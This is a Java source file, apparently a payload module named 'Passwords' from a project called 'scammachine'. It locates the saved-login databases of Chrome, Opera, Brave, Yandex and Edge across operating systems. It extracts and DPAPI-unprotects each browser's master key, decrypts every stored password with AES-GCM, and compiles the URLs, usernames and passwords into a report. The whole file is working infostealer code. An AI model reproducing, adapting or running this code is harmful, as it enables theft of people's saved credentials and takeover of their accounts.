package me.teejayx6.scammachine.payloadz;

import com.github.windpapi4j.InitializationFailedException;
import com.github.windpapi4j.WinAPICallFailedException;
import com.github.windpapi4j.WinDPAPI;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.sun.jna.platform.win32.Crypt32Util;
import me.teejayx6.scammachine.util.FileUtils;
import me.teejayx6.scammachine.util.TempFile;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.*;
import java.util.stream.Collectors;
import java.util.stream.Stream;

public class Passwords
{
    private static final int GCM_TAG_LENGTH = 16;
    private static final int kKeyLength = 256 / 8;
    private static final int kNonceLength = 96 / 8;
    private static final String kEncryptionVersionPrefix = "v10";
    public static final String kDPAPIKeyPrefix = "DPAPI";
    public static String appdata() {
        return System.getenv("APPDATA");
    }
    public static String localAppdata() {
        return System.getenv("LOCALAPPDATA");
    }
    public static String home() {
        return System.getProperty("user.home");
    }

    public static Map<String, byte[]> masterkeys = new HashMap<>();

    public static byte[] GetMasterKey(String browser)
    {
        browser = GetBrowser(browser);
        if (masterkeys.containsKey(browser))
            return masterkeys.get(browser);

        return null;
    }

    public static String GetBrowser(String path)
    {
        if ((path.contains("Google") && path.contains("Chrome")) || path.contains("google-chrome"))
            return "Chrome";

        if (path.contains("Opera") || path.contains("opera"))
            return "Opera";

        if (path.contains("Brave"))
            return "Brave";

        if (path.contains("Yandex"))
            return "Yandex";

        if (path.contains("Microsoft") || path.contains("Edge"))
            return "Edge";

        return null;
    }

    public static String execute()
    {
        StringBuilder sb = new StringBuilder();
        Stream.of(new String[][]{
                {localAppdata() + "/Google/Chrome/User Data/Local State", localAppdata() + "/Google/Chrome/User Data/Default/Login Data"},
                {home() + "/Library/Application Support/Google/Chrome/User Data/Local State", home() + "/Library/Application Support/Google/Chrome/User Data/Default/Login Data"},
                {home() + "/.config/google-chrome/Local State", home() + "/.config/google-chrome/Default/Login Data"},
                {appdata() + "/Opera Software/Opera Stable/Local State", appdata() + "/Opera Software/Opera Stable/Default/Login Data"},
                {home() + "/Library/Application Support/Opera/Opera/Local State", "/Library/Application Support/Opera/Opera/Default/Login Data"},
                {home() + "/.config/opera/Local State", home() + "/.config/opera/Default/Login Data"},
                {localAppdata() + "/BraveSoftware/Brave-Browser/Local State", localAppdata() + "/BraveSoftware/Brave-Browser/Default/Login Data"},
                {home() + "/Library/Application Support/BraveSoftware/Brave-Browser/Local State", home() + "/Library/Application Support/BraveSoftware/Brave-Browser/Default/Login Data"},
                {home() + "/.config/BraveSoftware/Brave-Browser/Local State", home() + "/.config/BraveSoftware/Brave-Browser/Default/Login Data"},
                {localAppdata() + "/Yandex/YandexBrowser/User Data/Local State", localAppdata() + "/Yandex/YandexBrowser/User Data/Default/Login Data"},
                {home() + "/Library/Application Support/Yandex/YandexBrowser/Local State", home() + "/Library/Application Support/Yandex/YandexBrowser/Default/Login Data"},
                {home() + "/.config/Yandex/YandexBrowser/Local State", home() + "/.config/Yandex/YandexBrowser/Default/Login Data"},
                {localAppdata() + "/Microsoft/Edge/User Data/Local State", localAppdata() + "/Microsoft/Edge/User Data/Default/Login Data"},
                {home() + "/Library/Application Support/Microsoft/Edge/Local State", home() + "/Library/Application Support/Microsoft/Edge/Default/Login Data"},
                {home() + "/.config/Microsoft/Edge/Local State", home() + "/.config/Microsoft/Edge/Default/Login Data"}
        }).collect(Collectors.toMap(data -> new File(data[0]), data -> new File(data[1]))).entrySet().stream().filter(entry -> entry.getKey().exists() && entry.getValue().exists()).forEach((entry) -> {
            //File tempDB = new File(".\\Loginvault.db");
            //if (tempDB.exists()) tempDB.delete();
            Connection c;
            Statement stmt;
            try {
                TempFile tmpfile1 = FileUtils.readFile(entry.getKey().getAbsolutePath());
                JsonObject json = new JsonParser().parse(new String(tmpfile1.bytes)).getAsJsonObject();
                FileUtils.close(tmpfile1);
                byte[] key = Base64.getDecoder().decode(json.get("os_crypt").getAsJsonObject().get("encrypted_key").getAsString());
                key = Crypt32Util.cryptUnprotectData(Arrays.copyOfRange(key, 5, key.length));

                if (!masterkeys.containsKey(GetBrowser(entry.getValue().getAbsolutePath())))
                    masterkeys.put(GetBrowser(entry.getValue().getAbsolutePath()), key);

                TempFile tmpfile2 = FileUtils.readFile(entry.getValue().getAbsolutePath());
                ResultSet re = DriverManager.getConnection("jdbc:sqlite:" + tmpfile2.newpath).prepareStatement("SELECT `origin_url`,`username_value`,`password_value` from `logins`").executeQuery();
                StringBuilder builder = new StringBuilder();

                while (re.next()) {
                    String url = new String(re.getBytes("origin_url"));
                    String username = new String(re.getBytes("username_value"));
                    String password = null;

                    if(entry.getKey().getParent().equalsIgnoreCase(localAppdata() + "/Google/Chrome/User Data")) {
                        password = getKeyBytes(re.getBytes("password_value"), key);
                    } else password = decrypt(re.getBytes("password_value"), key);

                    if (!url.isEmpty() && !username.isEmpty() && !password.isEmpty()) builder.append(url).append(" | ").append(username).append(" | ").append(password).append("\n");
                    String passwdz = (String.format("FROM: %s\nURL: %s\nUSERNAME: %s\nPASSWORD: %s\n------------\n", entry.getKey().getParent(), url, username, password));
                    sb.append(passwdz);
                }

                FileUtils.close(tmpfile2);
            } catch (Exception e) {

            }
        });

        if (sb.length() == 0)
            return "None";

        return sb.toString();
    }

    public static String decrypt(byte[] password, byte[] key) {
        try {
            byte[] iv = Arrays.copyOfRange(password, 3, 15);
            password = Arrays.copyOfRange(password, 15, password.length);
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, iv));
            return new String(cipher.doFinal(password));
        } catch (Exception e) {
            return e.getMessage();
        }
    }

    public static String getKeyBytes(byte[] encryptedPassword, byte[] key) throws IOException, InitializationFailedException, WinAPICallFailedException {
        byte[] decryptedBytes = null;

        final boolean isV10 = new String(encryptedPassword).startsWith("v10");

        if (WinDPAPI.isPlatformSupported()) {
            final WinDPAPI winDPAPI = WinDPAPI.newInstance(WinDPAPI.CryptProtectFlag.CRYPTPROTECT_UI_FORBIDDEN);

            if (!isV10) {
                decryptedBytes = winDPAPI.unprotectData(encryptedPassword);
            } else {
                byte[] encryptedKeyBytes = key;
                if (!new String(encryptedKeyBytes).startsWith(kDPAPIKeyPrefix)) {
                    throw new IllegalStateException("Local State should start with DPAPI");
                }
                encryptedKeyBytes = Arrays.copyOfRange(encryptedKeyBytes, kDPAPIKeyPrefix.length(), encryptedKeyBytes.length);

                // Use DPAPI to get the real AES key
                byte[] keyBytes = winDPAPI.unprotectData(encryptedKeyBytes);
                if (keyBytes.length != kKeyLength) {
                    throw new IllegalStateException("Local State key length is wrong");
                }

                // Obtain the nonce.
                byte[] nonceBytes = Arrays.copyOfRange(encryptedPassword, kEncryptionVersionPrefix.length(), kEncryptionVersionPrefix.length() + kNonceLength);

                // Strip off the versioning prefix before decrypting.
                encryptedPassword = Arrays.copyOfRange(encryptedPassword, kEncryptionVersionPrefix.length() + kNonceLength, encryptedPassword.length);

                // Use BC provider to decrypt
                decryptedBytes = getDecryptBytes(encryptedPassword, keyBytes, nonceBytes);
            }
        }
        return new String(decryptedBytes);
    }

    public static final byte[] getDecryptBytes(byte[] inputBytes, byte[] keyBytes, byte[] ivBytes)
    {
        try
        {
            if (inputBytes == null)
            {
                throw new IllegalArgumentException();
            }

            if (keyBytes == null)
            {
                throw new IllegalArgumentException();
            }
            if (keyBytes.length != kKeyLength)
            {
                throw new IllegalArgumentException();
            }

            if (ivBytes == null)
            {
                throw new IllegalArgumentException();
            }
            if (ivBytes.length != kNonceLength)
            {
                throw new IllegalArgumentException();
            }

            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            SecretKeySpec secretKeySpec = new SecretKeySpec(keyBytes, "AES");
            GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(GCM_TAG_LENGTH * 8, ivBytes);
            cipher.init(Cipher.DECRYPT_MODE, secretKeySpec, gcmParameterSpec);
            return cipher.doFinal(inputBytes);
        }
        catch (Exception ex)
        {
            return ex.getMessage().getBytes(StandardCharsets.UTF_8);
        }

    }
}
